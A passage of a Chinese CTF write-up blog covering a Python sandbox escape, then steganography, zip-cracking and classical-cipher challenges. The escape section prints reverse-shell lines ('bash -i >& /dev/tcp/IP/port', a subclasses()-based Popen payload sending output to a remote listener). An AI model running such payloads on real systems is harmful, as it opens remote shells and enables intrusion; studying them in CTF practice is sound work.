<li><p><code>__dict__</code> 以字典形式存储类中的属性（包括方法），可以从 <code>dir()</code> 中获取相应属性字符串，再用 <code>__dict__[&#39;name&#39;]</code> 调用</p>
</li>
<li><p><code>__subclasses__()</code> 表示引用的所有子类</p>
</li>
<li><p>在’python3’中可以通过 <code>&quot;&quot;.__class__.__mro__[1]</code> 来获取’object’对象</p>
</li>
<li><p>在’python3’中所有的类默认继承自 Object 类，继承 object 的全部方法。’python2’中类默认为 “classobj” ，只有 <code>[&#39;__doc__&#39;, &#39;__module__&#39;]</code> 两个方法</p>
</li>
<li><p>python3 最大（内置）名称空间：”builtins” 和 <code>__builtins__</code> ，后者不需要导入</p>
</li>
<li><p>当返回内容为 <code>&lt;class &#39;type&#39;&gt;</code> 时，不知道如何用值去匹配，所以列表难以索引，只能逐个用 <code>__name__</code> 属性去匹配，如 <code>&lt;class &#39;subprocess.Popen&#39;&gt;.__name__</code> 的值为”Popen”；</p>
</li>
</ul>
<p><strong>参考:[</strong></p>
<p><a class="link"   href="https://www.anquanke.com/post/id/188172" >SSTI&#x2F;沙盒逃逸详细总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_43390703/article/details/106231154" >各种姿势解析-Python沙箱逃逸 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.freebuf.com/articles/system/203208.html" >一文看懂Python沙箱逃逸 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_39795292/article/details/110773931" >Python绕过 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/9178" >Python沙箱逃逸总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/h0cksr/p/16189741.html" >h0cksr-Python沙箱逃逸 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.zhihu.com/question/414045334/answer/1625710674" >Ncat与Netcat <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/ddzc/p/12382534.html" >subprocess.Popen <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_39628945/article/details/110269774" >Python连接字符串 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.runoob.com/python/python-func-eval.html" >Python eval()函数 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>因为之前重装了服务器，用命令 <code>yum -y install nc</code> 安装一下nc，然后先挂起nc的监听：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure></div>

<p><code>-l</code> 表示监听，<code>-v</code> 输出nc的相关信息，<code>-p</code> 表示指定端口，<code>-n</code> 表示直接使用IP地址，而不通过域名服务器；然后在本地开wsl尝试发送ls数据：<code>ls &gt; /dev/tcp/IP/233</code> ，结果没有成功，本地能ping通服务器，但是用 <code>telnet IP port</code> 测试会发现无法建立连接，腾讯云的防火墙已经开了，但是尝试反弹shell会出现报错：<a class="link"   href="https://blog.csdn.net/Zxiaobinggan/article/details/109093480" >“没有找到主机的路由 (Host unreachable)” <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，用 <code>systemctl status firewalld</code> 检查防火墙会发现处于开启状态(用 <code>sudo fire-cmd --state</code> 也行)，先用 <code>service firewalld stop</code> 关闭服务，重新监听端口后再尝试弹shell，这一次成功得到目录。</p>
<p>一般的反弹shell语句为：<code>bash -i &gt;&amp; /dev/tcp/IP/port 0&gt;&amp;1</code> 表示创建一个交互shell，并将输入输出都转移到目标服务器上，也可以不使用 <code>bash -i</code> ，而是将具体命令行的结果发送过去 <code>ls &gt; /dev/tcp/IP/port</code>。</p>
<p>顺便提一嘴，Ncat和Netcat其实是两个东西，后者已经不再更新，且功能上基本被前者完全替代，电脑上装有Ncat的情况下nc命令默认使用Ncat</p>
<p>接下来尝试反弹shell，先尝试payload：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[].__class__.__bases__[0].__subclasses__()[227](<span class="string">&#x27;ls &gt;&amp; /dev/tcp/IP/23333&#x27;</span>,shell=<span class="literal">true</span>)</span><br></pre></td></tr></table></figure></div>

<p>但是目标主机没反应，换一个payload：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[].__class__.__bases__[0].__subclasses__()[227]([<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;ls &gt;&amp; /dev/tcp/IP/23333&#x27;</span>])</span><br></pre></td></tr></table></figure></div>

<p>发现成功了，这是因为 <code>shell=true</code> 相当于在命令前面加上 <code>/bin/sh -c</code> 表示用sh来执行命令，很不巧的是sh不支持 <code>/dev/tcp</code> ，这是bash专属的；而如果不带shell参数，则要传入一个命令列表，其中第一项需要是一个可访问的文件，调用bash执行命令即可，参考：<a class="link"   href="https://www.jianshu.com/p/9d4e4cf06d23" >python-subprocess.Popen的使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>其次这里也无法使用 <code>chsh -s /bin/bash</code> 来切换shell，一方面是默认shell就不一定是sh，另一方面是该命令需要sudo，而不需要sudo的 <code>chsh</code> 是交互。<code>bash -c</code> 可以用bash执行接下来的命令</p>
<p>最后用grep命令找出flag即可…也不即可，黑心出题人的flag虽然确实在当前文件夹下，但是改了个前缀变成了 “r0v0t”，还好同一个文件夹下有好几个r00t{}格式的flag，翻一翻就能看到那可爱的”r0v0t”</p>
<p>最后要看懂沙箱逃逸所需要的时间是老实算验证码的不知道多少倍，我的评价是不如直接算验证码，珍惜头发</p>
<p><strong>参考:[</strong></p>
<p><a class="link"   href="https://blog.csdn.net/qq_45584159/article/details/111489653?utm_source=app&app_version=5.3.1&utm_source=app" >走在路上的小白鼠-常见的反弹shell方法及解释 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>flag字体颜色与背景一致，高光选中（Ctrl+A）或者直接翻源码都能找到。这题我也看了好久来着&#x3D; &#x3D;</p>
<h3 id="strange-LSB-strange-Significant-Bit"><a href="#strange-LSB-strange-Significant-Bit" class="headerlink" title="strange LSB -&gt; strange ? Significant Bit"></a>strange LSB -&gt; strange ? Significant Bit</h3><p>暴打pyy的题目，如果这题划成分，那我觉得成分里全是氵，只有一滴是LSB，那一滴还是骗人的。。。首先拿到题目，说是LSB，那就丢进steg里找找，找到了小半个flag…</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539239.bmp"
                     
                ><br>然后呢，然后啥都没有，把各个位数上的图片拿出来叠加也没有结果，于是就想给出的flag可能提示了图片的出处，付费（-36）的提示说是社工，好，那一定是上网搜图找地儿了吧，于是就搜啊搜，看着一个”Ma”找马达加斯加、找玛格丽特河，试一试名字行不行，毕竟flag不能直接给那就只能是这些现成的单词，结果一个都不对…然后新提示来了，看看出题人的qq，行，瞅一眼，哇哦，居然有这张图，感情是自己整的，那难道是qq信息里有什么地名提示？搜罗一番还是莫得（沉迷地名无法自拔），再看群里，出题人说要用到手机。。。我就上手机一看，发现电脑上拿不下来的背景图手机上拿的下来，我想直接找LSB隐写就行了吧，然后什么都没有。。。于是就把下载下来的和空间找到的两张图叠图异或，然后找到了flag。然后提（pan）询（wen）出题人思路是什么，出题人表示：图像处理有点小难，所以加了个困难标签，合情合理。最后拿到了图像处理的源码，一份是”insertFlag.py”：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">lsb=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  <span class="comment">#读取图像</span></span><br><span class="line">  flagImg=cv2.imread(<span class="string">&quot;flag.png&quot;</span>,<span class="number">0</span>)<span class="comment">#黑白</span></span><br><span class="line">  sourceImg=cv2.imread(<span class="string">&quot;qq.jpg&quot;</span>,<span class="number">1</span>)<span class="comment">#彩色</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">#使生成的flag在图像的中间</span></span><br><span class="line">  startPoint=[(sourceImg.shape[<span class="number">0</span>]-flagImg.shape[<span class="number">0</span>])//<span class="number">2</span>,(sourceImg.shape[<span class="number">1</span>]-flagImg.shape[<span class="number">1</span>])//<span class="number">2</span>]</span><br><span class="line">  <span class="built_in">print</span>(flagImg.shape, sourceImg.shape, startPoint)</span><br><span class="line">  <span class="keyword">for</span> y,x <span class="keyword">in</span> product(<span class="built_in">range</span>(flagImg.shape[<span class="number">0</span>]),<span class="built_in">range</span>(flagImg.shape[<span class="number">1</span>])):</span><br><span class="line">    <span class="comment">#如果flag图像上这个像素是黑色的, 那就把原图的这个点的所有像素值-1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> flagImg[y,x]&lt;<span class="number">255</span>:</span><br><span class="line">      <span class="keyword">if</span> x&lt;<span class="number">200</span>: <span class="comment"># 200个像素宽的左半部分变化明显，将最后一位置为0（黑色），因此查看各通道最后一位时可见黑色的部分flag</span></span><br><span class="line">        sourceImg[y+startPoint[<span class="number">0</span>],x+startPoint[<span class="number">1</span>]]=sourceImg[y+startPoint[<span class="number">0</span>],x+startPoint[<span class="number">1</span>]]&amp;(~lsb)    <span class="comment"># ~lsb = 11111110 </span></span><br><span class="line">      <span class="keyword">else</span>: <span class="comment"># 右半部分做只对最低有效位进行的异或，因此需要异或叠图，并且由于异或出来的像素值很小，得到的图非常暗淡</span></span><br><span class="line">        sourceImg[y+startPoint[<span class="number">0</span>],x+startPoint[<span class="number">1</span>]]=sourceImg[y+startPoint[<span class="number">0</span>],x+startPoint[<span class="number">1</span>]]^lsb</span><br><span class="line">      </span><br><span class="line">  <span class="comment">#写出图像</span></span><br><span class="line">  cv2.imwrite(<span class="string">&quot;out.png&quot;</span>,sourceImg)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>和”getFlag.py”：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> insertFlag <span class="keyword">import</span> lsb</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  flagImg=cv2.imread(<span class="string">&quot;out.png&quot;</span>,<span class="number">1</span>)</span><br><span class="line">  sourceImg=cv2.imread(<span class="string">&quot;qq.jpg&quot;</span>,<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">for</span> y,x <span class="keyword">in</span> product(<span class="built_in">range</span>(flagImg.shape[<span class="number">0</span>]),<span class="built_in">range</span>(flagImg.shape[<span class="number">1</span>])):</span><br><span class="line">    <span class="keyword">if</span> (flagImg[y,x]-sourceImg[y,x]&lt;lsb).<span class="built_in">all</span>():</span><br><span class="line">      flagImg[y,x]=np.full((<span class="number">3</span>),<span class="number">255</span>,np.uint8)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      flagImg[y,x]=np.full((<span class="number">3</span>),<span class="number">0</span>,np.uint8)</span><br><span class="line">  cv2.imwrite(<span class="string">&quot;ans.png&quot;</span>,flagImg)</span><br></pre></td></tr></table></figure></div>

<p>这里用到了一个”insertFlag”的python组件，然鹅我看的也不是很懂。总之利用”stegSolve”的叠图运算可以解决，甚至比处理出来的还清楚（?）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539244.bmp"
                     
                ></p>
<p><strong>参考：[</strong></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_34075268/article/details/88744599" >Lsb图片隐写 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h3 id="骗！偷袭！绑架勒索！【任务B：情报收集】"><a href="#骗！偷袭！绑架勒索！【任务B：情报收集】" class="headerlink" title="骗！偷袭！绑架勒索！【任务B：情报收集】"></a>骗！偷袭！绑架勒索！【任务B：情报收集】</h3><p>一道很有趣的题，下下来一个.mht文件，是一封邮件，它会提示你用IE打开，但实际上它可以以文本格式打开，里面有最全面的信息，包括邮件的格式，虽然发件人仍然被隐藏了，但是会找到一串用Base64加密过的信息：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gV2FubmFFc2NhcGUg</span><br><span class="line">djEuMDAgYnkgWkhBTkdTQU4sIDIwMjItMDMtMzEgLS0+DQo8V2FubmFFc2NhcGU+DQoJPGVtYWls</span><br><span class="line">PmV6Zm9yZXZlckByMDB0ZWFtLmNjPC9lbWFpbD4NCgk8aW5mZWN0ZWQ+MjAyMi0wNC0wMVQwNjoy</span><br><span class="line">NToyMi4wMDBaPC9pbmZlY3RlZD4NCjwvV2FubmFFc2NhcGU+</span><br></pre></td></tr></table></figure></div>

<p>解密后的内容是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!-- WannaEscape v1.00 by ZHANGSAN, 2022-03-31 --&gt;</span><br><span class="line">&lt;WannaEscape&gt;</span><br><span class="line">	&lt;email&gt;ezforever@r00team.cc&lt;/email&gt;</span><br><span class="line">	&lt;infected&gt;2022-04-01T06:25:22.000Z&lt;/infected&gt;</span><br><span class="line">&lt;/WannaEscape&gt;</span><br></pre></td></tr></table></figure></div>

<p>我第一次还没看到，后来又绕回了这里才发现有一个”by ZHANGSAN”，注意这题直接交人名作为答案即可，不需要包上flag格式。起初我是以为这题要得到文件本体或者真的发送邮件到某个地址，从回信中得到人名的，结果发现里面的所有邮件信息，除了Ezforever的，都是伪造的。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">spaces</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">=_NextPart_SMP_1d844a4b687fc8d_52122bf1_00000001</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1100 0010 1010 0000</span><br><span class="line">C2 A0</span><br><span class="line">64+2+1 67 C</span><br><span class="line">5</span><br></pre></td></tr></table></figure></div>

<h3 id="FlaggyBird"><a href="#FlaggyBird" class="headerlink" title="FlaggyBird"></a>FlaggyBird</h3><p>菜就多练练，游戏题怎么可以不打游戏呢</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539266.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539299.png"
                     
                ></p>
<p>或者也可以不打游戏，试着用 <a class="link"   href="http://c.biancheng.net/view/2690.html" >pyinstall <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 处理这个python小游戏，可以借助010editor浏览游戏文件的文件内容，判断文件类型</p>
<p>下载一个<a class="link"   href="https://github.com/extremecoders-re/pyinstxtractor" >“pyinstxtractor-master” <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，将这个用python写的小游戏解压，然后如果用windows系统，就装一个<a class="link"   href="https://blog.csdn.net/mainmaster/article/details/122995603" >“grep for windows” <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，在命令行输入 <code>grep r00t -r  flaggybird.exe_extracted </code> ，搜索文件夹中存在关键字的地方，然后再在响应文件夹下输入 <code>strings flyppybird.pyc | grep -a r00t</code> ，<code>|</code> 表示管道，左边是输入，右边是根据左边的输入得到相应输出，<code>strings</code> 将二进制文件转化为文本，<code>-a</code> 强行显示文本内容，最后得到flag。如果命令出错：<code>strings flyppybird.pyc | grep -a r00t flyppybird.pyc</code> 导致有文件挤占管道的输入会出现报错：<code>no space left on device</code> </p>
<h3 id="所以这红桩子到底是什么！？"><a href="#所以这红桩子到底是什么！？" class="headerlink" title="所以这红桩子到底是什么！？"></a>所以这红桩子到底是什么！？</h3><p>提起舟山，我一个学过地理的浙江人第一反应居然是杭州…地点在浙江省宁波舟山市，flag是地点名，关键信息是学校旁边有条河，河对面有个码头，看图这条河挺宽，右边还有很多小岛，所以flag格式才会那么丰富，有岛湖礁。打开手机版的腾讯地图搜索舟山市码头，找找看在内河旁边的码头有几个，三江客运中心是，但河对面没有学校，而且这条河是内河，地图上没看到有岛礁，外侧那条宽的不知道称不称的上是河的水路对面是一座小岛，也找不到学校的影子；看完这个我就想到这条宽阔有岛礁的河可能不是内河，在主岛上浏览一遍水路的周侧，基本都很窄，而且对面没有学校，看起来也不像是有岛礁的样子，所以可以考虑这条所谓的河是环岛外侧的河，而不是岛内的河。再搜索”舟山市码头 学校”，跳出来的是墩头码头，很可惜对面没有学校；既然学校这么难找，那就直接搜索”舟山市学校”，其中位于岛外侧且对面或附近有岛礁的有沈家门中学、浙江大学一片与浙江海洋大学长峙校区，我直接就看浙江大学去了，为了比对风景先切换到卫星地图，校区离这条河不远，往对岸看的话右侧确实有一片岛礁，放大以后细看会看到一个吐出来的红色区域，可能是集装箱，所以应该有码头，但是地图上一开始不显示，拉到最大才会看见一个”王家墩码头”，基本符合的情况下找找红桩子，刚好从图中的视角来看集装箱的左后方有一块很模糊的深色陆地，所以很可能是，但是卫星地图下没有任何地名，切换回标准地图后会发现这块地方是”玉秃礁”，试了试发现就对了，所以就是这里。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539318.png"
                     
                ></p>
<p>做完以后再来分析一下这题的提示，这条朋友圈的语气像是新生入学，所以大学的可能性很大；另一方面”王家墩码头”搜索”舟山市码头”是不会显示的，但是直接搜索”码头”它会显示一个小红点，这应该是关键词的问题。最后如果可以试着搜索一下关键字”舟山市码头 学校”，它会导向”舟山壹号码头餐厅”，放大后会找到”王家墩码头”，对面有小学和大学，刚好是符合条件的，但我一开始没明白这个关键词为什么会导到这里，后来想想可能是因为大学生经常出入这一块，所以关联性比较强。</p>
<h3 id="骗！偷袭！绑架勒索！"><a href="#骗！偷袭！绑架勒索！" class="headerlink" title="骗！偷袭！绑架勒索！"></a>骗！偷袭！绑架勒索！</h3><p>文件提示里只有一个特殊字符：<code>C2 A0</code> ，是”non-breaking space”，能保证不被压缩长度（很多空白字符连续在某些环境会被压缩）并保证两侧的文字处在同一行，常用于排版，会写成 <code>&amp;nbsp</code> ；恰巧题目又提示我们回去看那封勒索信，在下方的段落中看到 <code>&lt;i&gt;</code> 标记的几个字母拼接出的英文：”spaces”。显然是要我们注意 <code>&amp;nbsp</code> 。打开010editor一看，确实有很多C2A0，但是一时看不出什么规律，拖进VSC会发现VSC自动将这些非常规空格标记了出来。接下来的问题在于加密的方法到底是什么，考虑到flag是一串英文，我第一想法是藏头或者组合字母拼接英文，但很可惜这个思路怎么也行不通，后来想到 <code>&amp;nbsp</code> 的作用，又试着将这些不换行的地方强行换行了一下，但也没找到什么东西。结果这居然是摩尔斯电码</p>
<p>为什么这也能整成摩尔斯电码…确实有点抽象，特殊空格为长，正常空格为短，一行取一个字母。用摩尔斯电码来解读确实很好的解释了为什么这封邮件有这么奇怪的换行排版，以及密文为什么非得分到三块内容中去写，而不是简单的集成在某一部分</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your-important files-are 		-.-  k</span><br><span class="line">encrypted.-Many-of-your			---  o</span><br><span class="line">documents, photos,-videos		.-   a</span><br><span class="line">and other-files are no			.-.. l</span><br><span class="line">longer accessible because		..   i</span><br><span class="line">they-have-been					--   m</span><br><span class="line">encrypted. You-can				.-   a</span><br><span class="line">verify-this by trying			-..  d</span><br><span class="line">to open							.	 e</span><br><span class="line">them.-Maybe-you					--	 m</span><br><span class="line">are looking						.	 e</span><br><span class="line">for-a way to					-..  d</span><br><span class="line">recover-your-files,-but			---  o</span><br><span class="line">do-not							-	 t</span><br><span class="line">waste your time. Nobody can		.... h</span><br><span class="line">recover your files				..	 i</span><br><span class="line">without our decryption service.	...	 s</span><br><span class="line"></span><br><span class="line">We guarantee that				..	 i</span><br><span class="line">you can recover all-your		...- v</span><br><span class="line">files safely					.	 e</span><br><span class="line">and-easily. But you need		-... b</span><br><span class="line">to pay,							.	 e</span><br><span class="line">and you							.	 e</span><br><span class="line">only-have 3						-.   n</span><br><span class="line">days to-submit					.-   a</span><br><span class="line">the-payment. After that the		-... b</span><br><span class="line">price-will be doubled.			-..	 d</span><br><span class="line">Also, if you-don&#x27;t				..-  u</span><br><span class="line">pay-in 7-days, you 				-.-. c</span><br><span class="line">won&#x27;t-be						-	 t</span><br><span class="line">able to							.	 e</span><br><span class="line">recover-your files forever.		-..	 d</span><br><span class="line"></span><br><span class="line">Payment is accepted in			...  s</span><br><span class="line">Dogecoin only.					.	 e</span><br><span class="line">Please-check the				-.	 n</span><br><span class="line">current-price and buy			-..	 d</span><br><span class="line">some Dogecoins, then send the	.... h</span><br><span class="line">correct amount					.	 e</span><br><span class="line">to the-address specified below	.-.. l</span><br><span class="line">Contact us-for-more information .--. p</span><br><span class="line"></span><br><span class="line">koali made me do this i ve been abducted(劫持) send help</span><br></pre></td></tr></table></figure></div>

<p>说人话就是koali绑架了我，我被劫持了，发出求救信号（koali风评被害）</p>
<p>说实话就是我真没想到摩尔斯电码能这样解，一开始我看着空格的位置也考虑了一下摩尔斯电码，但没想明白长短如何分配，而且前面的 <code>spaces</code> 的提示是单词拆出字母组合而成的，所以我一直觉得是由 <code>&amp;nbsp</code> 附近的单词组合字母得到flag，毕竟这个特殊字符最大的意义就是控制不换行，那不换行总该是一个提示吧，结果真不是…</p>
<h3 id="第八号当铺"><a href="#第八号当铺" class="headerlink" title="第八号当铺"></a>第八号当铺</h3><p>众所周知，misc人称小密码学，下载文件的名称就提示了这是个jpg文件，或者查看二进制数据也可以通过文件头确认是jpg文件，修改后缀打开图片，是一串由工田balabala。</p>
<p>网上搜由工田，会发现这题是<a class="link"   href="https://www.cnblogs.com/Clair-is-com/p/16191740.html" >当铺密码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，出头几划就是数字几：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">114 48 48 116 123 100 111 110 116 95 112 97 119 110 95 121 111 117 114 95 108 105 102 101 125 </span><br></pre></td></tr></table></figure></div>

<p>将数字转换成相应字母即可得到flag：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s=<span class="built_in">input</span>()</span><br><span class="line">num=<span class="number">0</span></span><br><span class="line">ss=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> x==<span class="string">&quot; &quot;</span>:</span><br><span class="line">        num=<span class="built_in">int</span>(ss)</span><br><span class="line">        ss=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(num),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ss=ss+x;</span><br></pre></td></tr></table></figure></div>

<h3 id="Jigsaw"><a href="#Jigsaw" class="headerlink" title="Jigsaw"></a>Jigsaw</h3><p>给了个7z的文件，显然是压缩包，修改后缀后解压打开会发现一堆零散的图片</p>
<p>费电脑还费眼睛的一道拼图题，不用拼完也能得到flag：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">r00t&#123;NieR_Aut0_mata_2B&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中0和o区分一下就好。</p>
<p>但我还是试着给它拼完了：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539285.png"
                     
                ></p>
<p>除了人物主体比较分明，后面的背景真是一眼难尽，本来就高度相近的色调与飘忽的线条，突出一个抽象，不过这背景的真的很美，拼图分开的时候觉得各种割裂，拼在一起以后又觉得意外的和谐，很多地方不放上去比较一下都发现不了可以接在一起，局部色彩相近但整体效果却相当好，各部分拼图的接口处往往都是色彩的分界线，这么小的色彩尺度还能有这么漂亮的效果，只能说画师太牛了。</p>
<h3 id="CAESAR"><a href="#CAESAR" class="headerlink" title="CAESAR"></a>CAESAR</h3><p><em>I came，I saw，I conquered</em></p>
<p>下载下来一个压缩包，如果用7z解压会直接解压出文件，但是会提示文件头错误；如果用别的压缩软件解压会提示输入密码，直接打开压缩包会发现里面的内容没上锁，显然是一个伪加密，进入010editor，会发现里边包了四层PK（zip文件头），好吧真牛，从 <code>50 4B</code> 开始的八个字节都是固定格式的，可以标记为zip的文件格式特点，接下来两个字节是<strong>全局方式位标记</strong>，<code>00 00</code> 表示未加密，可以看到第三层PK的标记是 <code>09 00</code> ，修改后可直接解压。（文件修复后伪加密没了）</p>
<p>发现里面有一个加密的”flag.zip”和tips.txt文件。这次是真加密，提示输入密码，先用ARCHPR试着爆破一下，感觉不太能跑出来的样子；tips提示是”[–(CRC-32)–]”，CRC是一种校验码，可以用来验证文件的完整性与正确性，并且是一种易碰撞的哈希，起到标识文件的作用，但是它无法用于修复文件，如果被加密的flag大小比较小（六字节左右）可以考虑用<strong>CRC碰撞</strong>直接解出flag，但这里的flag长度有22个字节显然不行，恰巧flag.zip里也有tips.txt，那有可能是明文攻击，将tips压缩后得到zip文件，内部的tips文件CRC与flag.zip里的CRC是一样的，说明确实是明文攻击，拖进ARCHPR里分析一下就出来了，直接从包中读取flag就行</p>
<p>题目里的”I saw”指的就是明文攻击吧</p>
<ul>
<li>为了避免ARCHPR报错，压缩tips文件需要尽量用与flag.zip相同的压缩软件或算法，同样是压缩成zip，7z和rar却一个报错一个不报错；</li>
<li>ARCHPR明文攻击条件下，选择文件时先选加密文件会有报错：无法访问xxx文档；加密算法不同会报错：文档不匹配；明文长度小于12会报错：没有足够的数据用于分析（修复前的文件就是六个字节大小的提示，无法进行明文攻击）</li>
</ul>
<p><strong>参考:[</strong></p>
<p><a class="link"   href="https://blog.csdn.net/qq_43625917/article/details/96148661" >Qwzf-zip压缩包的总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/leixiao-/p/9824557.html" >l3yx-破解压缩包的几种方式 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="旅途中的收获"><a href="#旅途中的收获" class="headerlink" title="旅途中的收获"></a>旅途中的收获</h3><p>密文：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tuqh sqjxo</span><br><span class="line">xuhu yi co auo</span><br><span class="line">squiuh yi jxu aydw ev hecqd ucfyhu</span><br><span class="line"></span><br><span class="line">tuqh sqjxo xuhu yi co auo squiuh yi jxu aydw ev hecqd ucfyhu</span><br></pre></td></tr></table></figure></div>

<p>“Form KS” 和地中海（罗马帝国在地中海沿岸）提示了是凯撒密码，把26个密钥爆破一遍，找出可读的那一串即可：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  string str;</span><br><span class="line">  <span class="built_in">getline</span>(cin,str);</span><br><span class="line">  <span class="type">int</span> i=<span class="number">25</span>;</span><br><span class="line">  <span class="type">int</span> k=str.<span class="built_in">length</span>();</span><br><span class="line">  <span class="keyword">while</span>(i--)&#123;</span><br><span class="line">      <span 